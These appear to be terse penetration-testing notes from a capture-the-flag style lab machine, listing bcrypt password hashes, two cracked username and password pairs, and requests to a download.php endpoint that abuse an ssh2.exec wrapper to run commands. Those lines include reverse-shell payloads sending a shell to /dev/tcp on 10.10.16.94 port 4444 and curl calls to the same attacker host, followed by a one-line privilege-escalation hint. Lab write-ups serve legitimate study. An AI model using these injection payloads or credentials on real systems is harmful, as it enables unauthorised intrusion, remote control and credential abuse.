## Credentials
yurivich@era.com

ethan$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
john$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
~={yellow}yuri=~$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:~={yellow}mustang=~
veronica$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
admin_ef01cab31aa$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
~={yellow}eric=~$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:~={yellow}america=~


ssh2.exec://user:pass@example.com:22/usr/local/bin/sh -i >& /dev/tcp/10.10.16.94/4444 0>&1
GET /download.php?show=true&id=9215&format=ssh2.exec://yuri:mustang@10.10.11.79:22/usr/bin/curl+http://10.10.16.94:3000/

### wrapper
```sh
GET /download.php?show=true&id=150&format=ssh2.exec://eric:america@localhost:22/sh+i+>%26+/dev/tcp/10.10.16.94/4444+0>%261;curl http://10.10.16.94:3000/; HTTP/1.1
```
- Use `localhost` anytime you want to access service that is running on the server. Don't use the IP address of the server it self.

## PrivEsc

Then found executable file that root runs it, and i have permissions to rewrite it.
